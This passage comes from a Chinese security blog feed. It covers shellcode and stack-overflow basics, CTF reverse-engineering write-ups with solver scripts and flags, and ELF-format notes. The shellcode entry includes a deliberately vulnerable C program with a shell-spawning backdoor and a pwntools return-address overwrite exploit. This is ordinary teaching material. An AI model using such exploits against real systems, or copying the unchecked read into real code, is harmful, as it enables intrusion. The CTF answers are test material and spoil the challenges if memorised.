        <content type="html"><![CDATA[<h1 id="Shellcode的使用于介绍"><a href="#Shellcode的使用于介绍" class="headerlink" title="Shellcode的使用于介绍"></a>Shellcode的使用于介绍</h1><p>Shellcode 实际上是一段可以独立执行的代码（也可以认为是一段填充数据），在触发了缓冲区溢出漏洞并获取了eip指针的控制权后，通常会将eip指针指向Shellcode以完成漏洞利用全过程。从功能上看，Shellcode在整个漏洞利用过程中发挥主要作用实现对计算机端的控制。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525222041281.png" alt="image-20230525222041281"></p><p>Shellcode是漏洞利用的必须的一个要素，也是漏洞分析的重要环节。我们可以通过对Shellcode进行定位来辅助回潮漏洞原理，并确定漏洞特征。通过对Shellcode功能的分析，我们还可以确定漏洞样本的漏洞样本的危害程度及目的，并有可能追踪攻击来源，这对APT攻击分析中的溯源工作非常有利</p><p>Shellcode 在漏洞样本中的存在形式一般为一段可以自主运行的汇编代码。它不依赖任何编译环境，也不能像在 IDE 中直接编写代码那样调用 API 两数名称来实现功能。它通过主动查找DLL基址并动态获取API地址的方式来实现API 调用，然后根据实际功能调用相应的 API 两数来完成其自身的功能。</p><p>Shelleode 分为两个模块，分别是基本模块和功能模块，结构如图所示。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525223123130.png" alt="image-20230525223123130"></p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p><strong>什么是栈溢出？</strong></p><p>栈溢出这个东西其实就是程序给你划分了一块空间，但是你写的代码允许输入超出这片空间大小的数据，就把你的数据输入到了合法空间之外的地方造成了破坏，那么在这不允许用户操作的空间之中有着多的关键寄存器可以被我们控制我们利用栈溢出传输数据改变寄存器的值达到代码执行的效果。</p><p><strong>存在栈溢出的危险操作</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strcat() 字符串的复制越界复制</span><br><span class="line">gets()无限制长度输入数据</span><br><span class="line">scanf(&quot;%s&quot;)无限制长度输入数据</span><br><span class="line">read(0,buf,xx) xx的大小大于buf本身</span><br></pre></td></tr></table></figure><p>这里做个简单的不开启PIE 不开启canary保护的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shellcodetest</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>vim code.c</li><li>把代码复制进去 :wq保存</li><li>gcc -m64 -fno-stack-protector code.c -o code</li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525224332228.png" alt="image-20230525224332228"></p><p>ok</p><p>00400566            0040058C</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./code&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x00400566</span><span class="comment">#这个是有溢出漏洞位置的函数</span></span><br><span class="line">back = <span class="number">0x0040058C</span><span class="comment">#这个是含有后面的函数</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(ret)+p64(back)<span class="comment">#&quot;a&quot;*0x18 这个是需要溢出的大小</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525232604625.png" alt="image-20230525232604625"></p><h1 id="二进制安全漏洞之缓冲区溢出"><a href="#二进制安全漏洞之缓冲区溢出" class="headerlink" title="二进制安全漏洞之缓冲区溢出"></a>二进制安全漏洞之缓冲区溢出</h1><p>C函数调用过程原理及函数栈帧分析</p><h2 id="栈是什么？"><a href="#栈是什么？" class="headerlink" title="栈是什么？"></a>栈是什么？</h2><p>栈式一种LIFO【last in first out】的数据结构。所有的数据都是先进后出的。栈支持两种基本操作，push和pop。push将数据压入栈中，pop将栈中的数据弹出并存储到指定寄存器或者内存中</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230526203556140.png" alt="image-20230526203556140"></p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230526203803454.png" alt="image-20230526203803454"></p><p>这里需要注意2个点</p><ul><li><p>1.上面例子中栈的生长方向是从高地址到低地址的，这是因为在下文讲的栈帧中，栈就是向下生长的，因此这里也用这种形式的栈；</p></li><li><p>2.pop操作后，栈中的数据并没有被清空，只是该数据我们无法直接访问。</p></li></ul><p>有了这些栈的基本知识，我们现在可以来看看在x86-32bit系统下，C语言函数是如何调用的了。</p><h2 id="栈帧是什么？"><a href="#栈帧是什么？" class="headerlink" title="栈帧是什么？"></a>栈帧是什么？</h2><p>栈帧，也就是stack frame，其本质就是一种栈。一种专门用于保存函数调用过程中各种信息【参数，返回地址，本地变量等】。</p><p>栈帧有栈顶和栈底之分，其中栈顶的地址最低，栈底的地址最高。</p><p>在x86-32bit中，我们用 %ebp 指向栈底，也就是基址指针；用 %esp指向栈顶，也就是栈指针。</p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230526204154062.png" alt="image-20230526204154062" style="zoom:50%;" /><p>并不是整个栈空间只有一个栈帧，每调用一个函数，就会生成一个新的栈帧。</p><p>我们将调用函数的函数称为“调用者（caller）”，将被调用的函数称为被调用者（callee）。在这个过程中</p><ol><li>调用者需要知道在那里获取被调用者返回的值。</li><li>被调用者需要知道传入的参数在哪里。</li><li>返回的地址在哪里。同时我们需要保证在“被调用者”返回后，%ebp，%esp等寄存器的值应该和调用前一致。所以就需要用栈这个特殊的数据结构来保存数据</li></ol><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230526204804049.png" alt="image-20230526204804049"></p><p><strong>调用者</strong></p><ol><li>把被调用者函数的参数按照从右到左的顺序压入栈中</li><li>将返回地址压入栈中，调用玩函数后要返回。</li></ol><p><strong>被调用者</strong></p><ol><li>将老的（调用者）%ebp压入栈，此时%esp指向它。</li><li>将%esp的值赋%ebp，%ebp就有了新的值，它也指向存放老%ebp的栈空间。此时，它成了函数栈帧的栈底。这样，我们就保存了调用者函数%ebp，并且建立了一个新的栈帧</li></ol><p>这些其实在之前就有说到过。大概理解就好了。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-[GXYCTF2019]luck_guy（12）</title>
      <link href="/2023/05/25/Re%E5%88%B7%E9%A2%98%E5%92%AF-12-BUU-GXYCTF2019-luck-guy/"/>
      <url>/2023/05/25/Re%E5%88%B7%E9%A2%98%E5%92%AF-12-BUU-GXYCTF2019-luck-guy/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525181631610.png" alt="image-20230525181631610"></p><p>是一个ELF 文件 ，这里可以先打开看看是啥</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525183059771.png" alt="image-20230525183059771"></p><p>其实我猜测，这里有一个算法，输入的东西然后进行匹配吧。</p><p>上面知道了是64位的，我们这里就用IDA打开看看</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525183506559.png" alt="image-20230525183506559"></p><p>很明显这个patch_me这个函数是关键</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525183542646.png" alt="image-20230525183542646"></p><p>传入的值放入 al 中，然后对他进行了if判断，这里看get_flag这个函数。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 s; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        s = <span class="number">0x7F666F6067756369</span>LL;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最开始的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v0 = time(<span class="number">0LL</span>);</span><br><span class="line"> srand(v0);</span><br><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line"> &#123;</span><br></pre></td></tr></table></figure><p>这里用了随机数，但是用随机数不太可能</p><p>然后，下面有5个case 语句 case 2和case 3 实际没有啥作用</p><p>现在分开看case 1 4 5 </p><p>case 1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">       <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">       <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">       <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);                 <span class="comment">// strcat 是往后面追加字符串的函数</span></span><br><span class="line">                                               <span class="comment">// f1: db &#x27;GXY&#123;do_not_&#x27;,0 </span></span><br><span class="line">       <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);                <span class="comment">// f2的值不知道是啥，但是知道f2的值在f1后面，踏面链接起来的。应该是链接好了就是flag</span></span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>case 4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    s = <span class="number">0x7F666F6067756369</span>LL;               <span class="comment">// 这里的s点过去看到应该是大端存放，所以应该是倒叙的。s=</span></span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);          <span class="comment">// 在f2后面追加了s【这里的s需要是倒叙】</span></span><br><span class="line"><span class="comment">//因为f2是空的，所以f2也就是s</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>case 5</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">       <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">           *(&amp;f2 + j) -= <span class="number">2</span>;                    <span class="comment">// f2[j] -=2 这里的&amp;f2+j 就是数组的意思</span></span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           --*(&amp;f2 + j);                       <span class="comment">// f[j] --</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> f2[] = &#123; <span class="number">0x69</span> ,<span class="number">0x63</span> ,<span class="number">0x75</span> ,<span class="number">0x67</span> ,<span class="number">0x60</span> ,<span class="number">0x6F</span> ,<span class="number">0x66</span> ,<span class="number">0x7F</span> &#125;;</span><br><span class="line"><span class="type">char</span> w[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">w[i] = f2[i] - <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">w[i] = f2[i] - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, w);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525193337312.png" alt="image-20230525193337312"></p><p>然后和前面的f1链接起来</p><p>GXY{do_not_hate_me}</p><p>flag{do_not_hate_me}</p>]]></content>
      
      
      <categories>
          
          <category> BUU-Re题目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-Java逆向解密(11)</title>
      <link href="/2023/05/25/Re%E5%88%B7%E9%A2%98%E5%92%AF-11-BUU-Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86/"/>
      <url>/2023/05/25/Re%E5%88%B7%E9%A2%98%E5%92%AF-11-BUU-Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>程序员小张不小心弄丢了加密文件用的秘钥，已知还好小张曾经编写了一个秘钥验证算法，聪明的你能帮小张找到秘钥吗？ 注意：得到的 flag 请包上 flag{} 提交</p><p>这个是一个.class文件，需要用   jd-gui   这个东西打开</p><p> jd-gui  github 地址: <a href="https://github.com/java-decompiler/jd-gui/releases">https://github.com/java-decompiler/jd-gui/releases</a> </p><p>下载直接打开就好了。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525174439149.png" alt="image-20230525174439149"></p><p>看这个for 循环【虽然我没学过java但是大概还是能知道这个是在干什么】</p><p>就是一个异或，很简单了</p><h2 id="1-python"><a href="#1-python" class="headerlink" title="1.python"></a>1.python</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">strs = [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>,</span><br><span class="line"> <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(strs)):</span><br><span class="line">flag += <span class="built_in">chr</span>(strs[i] - <span class="number">64</span> ^ <span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="2-C"><a href="#2-C" class="headerlink" title="2.C"></a>2.C</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> KEY[] = &#123;</span><br><span class="line"><span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>,</span><br><span class="line"><span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span> &#125;;</span><br><span class="line"><span class="type">char</span> a[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">18</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = KEY[i] - <span class="number">64</span> ^ <span class="number">0x20</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525180628761.png" alt="image-20230525180628761"></p><p>flag{This_is_the_flag_!}</p>]]></content>
      
      
      <categories>
          
          <category> BUU-Re题目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件结构简介（30）</title>
      <link href="/2023/05/25/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-30-ELF%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E7%AE%80%E4%BB%8B/"/>
      <url>/2023/05/25/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-30-ELF%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="ELF文件结构介绍"><a href="#ELF文件结构介绍" class="headerlink" title="ELF文件结构介绍"></a>ELF文件结构介绍</h1><h2 id="1-ELF文件介绍"><a href="#1-ELF文件介绍" class="headerlink" title="1.ELF文件介绍"></a>1.ELF文件介绍</h2><p>首先需要知道的是：对象文件（Object files）有三个种类</p><h3 id="可重定位的对象文件（Relocatable-file）"><a href="#可重定位的对象文件（Relocatable-file）" class="headerlink" title="可重定位的对象文件（Relocatable file）"></a><strong>可重定位的对象文件（Relocatable file）</strong></h3><p>这是由编译前汇编生成的 .o 文件。后面的连接器（link editor）拿一个或一些Relocatable object files 作为输入，经链接处理后，生成一个可执行的对象文件 (Executable file) 或者一个可被共享的对象文件(Shared object file)。我们可以使用 ar 工具将众多的 .o Relocatable object files 归档(archive)成 .a 静态库文件。如何产生 Relocatable file，你应该很熟悉了，请参见我们相关的基本概念文章和JulWiki。另外，可以预先告诉大家的是我们的内核可加载模块 .ko 文件也是 Relocatable object file。</p><h3 id="可执行的对象文件-Executable-file"><a href="#可执行的对象文件-Executable-file" class="headerlink" title="可执行的对象文件(Executable file)"></a><strong>可执行的对象文件(Executable file)</strong></h3><p>文本编辑器vi、调式用的工具gdb、播放mp3歌曲的软件mplayer等等都是Executableobject file。</p><p>在我们的 Linux 系统里面，存在两种可执行的东西。除了这里说的Executable object file，另外一种就是可执行的脚本(如shell脚本)。</p><p>注意这些脚本不是 Executableobject file，它们只是文本文件，但是执行这些脚本所用的<strong>解释器</strong>就是 Executable object file，比如bash shell 程序</p><h3 id="可被共享的对象文件-Shared-object-file"><a href="#可被共享的对象文件-Shared-object-file" class="headerlink" title="可被共享的对象文件(Shared object file)"></a><strong>可被共享的对象文件(Shared object file)</strong></h3><p>这些就是所谓的动态库文件，也即 .so 文件。</p><p>动态库在发挥作用的过程 中，必须经过两个步骤：</p><ol><li>链接编辑器(link editor)拿它和其他Relocatable object file以及其他shared object file作为输入，经链接处理后，生存另外的shared object file或者executable file。</li><li>在运行时，动态链接器(dynamic linker)拿它和一个Executable file以及另外一些Shared object file来一起处理，在Linux系统里面创建一个进程映像。</li></ol><p>这里我们主要是以Shared Object File(.so)为重点分析对象，因为我们在逆向APK中会遇到的绝大部分都是此类文件。</p><h2 id="ELF文件格式"><a href="#ELF文件格式" class="headerlink" title="ELF文件格式"></a>ELF文件格式</h2><p>首先，ELF文件格式提供了两种视图，分别是链接视图和执行视图。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525233044161.png" alt="image-20230525233044161"></p><p>链接视图是以节（section）为单位，执行视图是以段（segment）为单位。链接视图就是在链接时用到的视图，而执行视图则是在执行时用到的视图。上图左侧的视角是从链接来看的，右侧的视角是执行来看的。总个文件可以分为四个部分：</p><ul><li><p>ELF header： 描述整个文件的组织。</p></li><li><p>Program Header Table: 描述文件中的各种segments，用来告诉系统如何创建进程映像的</p></li><li><p>sections 或者 segments：segments是从运行的角度来描述elf文件，sections是从链接的角度来描述elf文件，也就是说，在链接阶段，我们可以忽略program header table来处理此文件，在运行阶段可以忽略section header table来处理此程序（所以很多加固手段删除了section header table）。从图中我们也可以看出，segments与sections是包含的关系，<strong>一个segment包含若干个section</strong>。</p></li><li><p> Section Header Table: 包含了文件各个segction的属性信息，我们都将结合例子来解释。</p></li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525155813703.png" alt="image-20230525155813703"></p><p><strong>程序头部表</strong>（Program Header Table），如果存在的话，告诉系统如何创建进程映像。</p><p><strong>节区头部表</strong>（Section Header Table）包含了描述文件节区的信息，比如大小、偏移等。</p><p>可以通过执行命令”readelf -S android_server”来查看该可执行文件中有哪些section。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525160454072.png"></p><p>通过执行命令readelf –segments android_server，可以查看该文件的执行视图。</p><h2 id="3-ELF-Header"><a href="#3-ELF-Header" class="headerlink" title="3.ELF Header"></a>3.<strong>ELF Header</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT 16</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> e_ident[EI_NIDENT];</span><br><span class="line">    ELF32_Half e_type;</span><br><span class="line">    ELF32_Half e_machine;</span><br><span class="line">    ELF32_Word e_version;</span><br><span class="line">    ELF32__Addr e_entry;</span><br><span class="line">    ELF32_Off e_phoff;</span><br><span class="line">    ELF32_Off e_shoff;</span><br><span class="line">    ELF32_Word e_flags;</span><br><span class="line">    ELF32_Half e_ehsize;</span><br><span class="line">    ELF32_Half e_phentsize;</span><br><span class="line">    ELF32_Half e_phnum;</span><br><span class="line">    ELF32_Half e_shentsize;</span><br><span class="line">    ELF32_Half e_shnum;</span><br><span class="line">    ELF32_Half e_shstrndx;</span><br><span class="line">&#125;Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>e_ident ： ELF的一些标识信息，前四位为.ELF,其他的信息比如大小端等</p><p>e_machine ： 